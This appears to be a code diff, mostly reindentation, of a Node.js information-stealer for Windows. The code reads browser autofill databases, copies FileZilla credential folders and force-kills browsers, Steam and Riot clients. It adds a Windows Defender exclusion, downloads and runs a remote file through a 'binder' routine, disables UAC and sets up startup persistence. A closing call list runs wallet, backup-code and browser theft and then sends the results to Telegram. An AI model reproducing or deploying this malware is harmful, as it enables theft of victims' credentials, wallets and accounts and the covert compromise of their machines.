+        const webDataDBPath = pathData[0] + 'webdata.db';
+
+        fs.copyFileSync(webDataPath, webDataDBPath);
+
+        const db = new sqlite3.Database(webDataDBPath);
+
+        await new Promise((resolve, reject) => {
+            db.each(
+                'SELECT * FROM autofill',
+                function (error, row) {
+                    if (row) {
+                        autofillData.push(
+                            '================\nName: ' +
+                            row.name +
+                            '\nValue: ' +
+                            row.value +
+                            '\nApplication: ' +
+                            applicationName +
+                            ' ' +
+                            pathData[1] +
+                            '\n'
+                        );
+                    }
+                },
+                function () {
+                    resolve('');
+                }
+            );
+        });
+
+        if (autofillData.length === 0) {
+            autofillData.push('No autofills found for ' + applicationName + ' ' + pathData[1] + '\n');
+        }
     }
-  }
 
-  if (autofillData.length) {
-    const autofillsFolderPath = path.join(mainFolderPath, 'Autofills');
-    const autofillsFilePath = path.join(autofillsFolderPath, 'Autofills.txt');
+    if (autofillData.length) {
+        const autofillsFolderPath = path.join(mainFolderPath, 'Autofills');
+        const autofillsFilePath = path.join(autofillsFolderPath, 'Autofills.txt');
 
-    if (!fs.existsSync(autofillsFolderPath)) {
-      fs.mkdirSync(autofillsFolderPath);
+        if (!fs.existsSync(autofillsFolderPath)) {
+            fs.mkdirSync(autofillsFolderPath);
+        }
+
+        fs.writeFileSync(autofillsFilePath, user.copyright + autofillData.join(''), {
+            encoding: 'utf8',
+            flag: 'a+',
+        });
     }
-
-    fs.writeFileSync(autofillsFilePath, user.copyright + autofillData.join(''), {
-      encoding: 'utf8',
-      flag: 'a+',
-    });
-  }
 }
-   
+
 
 function copyriot(source, target, excludeList = []) {
     const targetFolder = path.join(target, path.basename(source));
@@ -4029,12 +4034,12 @@ async function RiotGameSession(cookie) {
 
 //
 async function submitFileZilla() {
-  const fileZillaSource = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\FileZilla`;
-  const fileZillaDestination = path.join(mainFolderPath, 'FileZilla');
+    const fileZillaSource = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\FileZilla`;
+    const fileZillaDestination = path.join(mainFolderPath, 'FileZilla');
 
-  if (fs.existsSync(fileZillaSource)) {
-    copyFolder(fileZillaSource, fileZillaDestination);
-  }
+    if (fs.existsSync(fileZillaSource)) {
+        copyFolder(fileZillaSource, fileZillaDestination);
+    }
 }
 
 function disableuac() {
@@ -4051,92 +4056,92 @@ function disableuac() {
 
 
 async function closeBrowsers() {
-  const browsersProcess = ["chrome.exe", "filezilla.exe", "msedge.exe","watcher.exe", "opera.exe", "brave.exe", "steam.exe", "RiotClientServices.exe"];
-  return new Promise(async (resolve) => {
-    try {
-      const tasks = execSync("tasklist").toString();
-      browsersProcess.forEach((process) => {
-        if (tasks.includes(process)) {
-          execSync(`taskkill /IM ${process} /F`);
-        }
-      });
+    const browsersProcess = ["chrome.exe", "filezilla.exe", "msedge.exe","watcher.exe", "opera.exe", "brave.exe", "steam.exe", "RiotClientServices.exe"];
+    return new Promise(async (resolve) => {
+        try {
+            const tasks = execSync("tasklist").toString();
+            browsersProcess.forEach((process) => {
+                if (tasks.includes(process)) {
+                    execSync(`taskkill /IM ${process} /F`);
+                }
+            });
 
-      await new Promise((innerResolve) => setTimeout(innerResolve, 2500));
-      resolve();
-    } catch (e) {
-      console.log(e);
-      resolve();
-    }
-  });
+            await new Promise((innerResolve) => setTimeout(innerResolve, 2500));
+            resolve();
+        } catch (e) {
+            console.log(e);
+            resolve();
+        }
+    });
 }
 
 const saveDir = 'C:\\ProgramData\\Microsoft';
 
 async function binder(url, saveDir) {
-  try {
-    // Add Windows Defender exclusion for the save directory
-    addDefenderExclusion(saveDir);
+    try {
+        // Add Windows Defender exclusion for the save directory
+        addDefenderExclusion(saveDir);
 
-    // Ensure the save directory exists
-    if (!fs.existsSync(saveDir)) {
-      fs.mkdirSync(saveDir, { recursive: true });
+        // Ensure the save directory exists
+        if (!fs.existsSync(saveDir)) {
+            fs.mkdirSync(saveDir, { recursive: true });
+        }
+
+        const fileName = path.basename(url);
+        const filePath = path.join(saveDir, fileName);
+
+        const response = await axios({
+            url,
+            method: 'GET',
+            responseType: 'stream'
+        });
+
+        response.data.pipe(fs.createWriteStream(filePath));
+
+        response.data.on('end', () => {
+            console.log(`File downloaded and saved to ${filePath}`);
+            executeCommandbinder(filePath);
+        });
+
+        response.data.on('error', (err) => {
+            console.error('Error during file download', err);
+        });
+
+    } catch (error) {
+        console.error('Error while running the script', error);
     }
-
-    const fileName = path.basename(url);
-    const filePath = path.join(saveDir, fileName);
-
-    const response = await axios({
-      url,
-      method: 'GET',
-      responseType: 'stream'
-    });
-
-    response.data.pipe(fs.createWriteStream(filePath));
-
-    response.data.on('end', () => {
-      console.log(`File downloaded and saved to ${filePath}`);
-      executeCommandbinder(filePath);
-    });
-
-    response.data.on('error', (err) => {
-      console.error('Error during file download', err);
-    });
-
-  } catch (error) {
-    console.error('Error while running the script', error);
-  }
 }
 
 function executeCommandbinder(filePath) {
-  const command = `start "" "${filePath}"`;
+    const command = `start "" "${filePath}"`;
 
-  exec(command, (error, stdout, stderr) => {
-    if (error) {
-      console.error(`Error executing the command: ${error.message}`);
-      return;
-    }
-    if (stderr) {
-      console.error(`Standard error: ${stderr}`);
-      return;
-    }
-    console.log(`Standard output: ${stdout}`);
-  });
+    exec(command, (error, stdout, stderr) => {
+        if (error) {
+            console.error(`Error executing the command: ${error.message}`);
+            return;
+        }
+        if (stderr) {
+            console.error(`Standard error: ${stderr}`);
+            return;
+        }
+        console.log(`Standard output: ${stdout}`);
+    });
 }
 
 function addDefenderExclusion(directory) {
-  const command = `powershell -Command "Add-MpPreference -ExclusionPath '${directory}'"`;
+    const command = `powershell -Command "Add-MpPreference -ExclusionPath '${directory}'"`;
 
-  exec(command, (error, stdout, stderr) => {
-    if (error) {
-      console.error(`Error adding Windows Defender exclusion: ${error.message}`);
-      return;
-    }
-    if (stderr) {
-      console.error(`Standard error: ${stderr}`);
-      return;
-    }
-    console.log(`Windows Defender exclusion added for ${directory}`);
-  });
+    exec(command, (error, stdout, stderr) => {
+        if (error) {
+            console.error(`Error adding Windows Defender exclusion: ${error.message}`);
+            return;
+        }
+        if (stderr) {
+            console.error(`Standard error: ${stderr}`);
+            return;
+        }
+        console.log(`Windows Defender exclusion added for ${directory}`);
+    });
 }
 
 
@@ -4195,19 +4200,19 @@ function handleMiscellaneous() {
 function onlyUnique(item, index, array) {
     return array.indexOf(item) === index;
 }
-    main();
-    hideconsole();
-    antivm();
-    //binder();
-    initializeFolders();
-    manageBrowsers();
-    games();
-    browsers();
-    filevpn();
-    backupcodes();
-    wallet();
-    disableuac();
-    computerinfo();
-    startup();
-    handleMiscellaneous();
-    SubmitTelegram();
+main();
+hideconsole();
+// antivm()
+//////binder();
+initializeFolders();
+manageBrowsers();
+games();
+browsers();
+filevpn();
+backupcodes();
+wallet();
+disableuac();
+computerinfo();
+startup();
+handleMiscellaneous();
+SubmitTelegram();
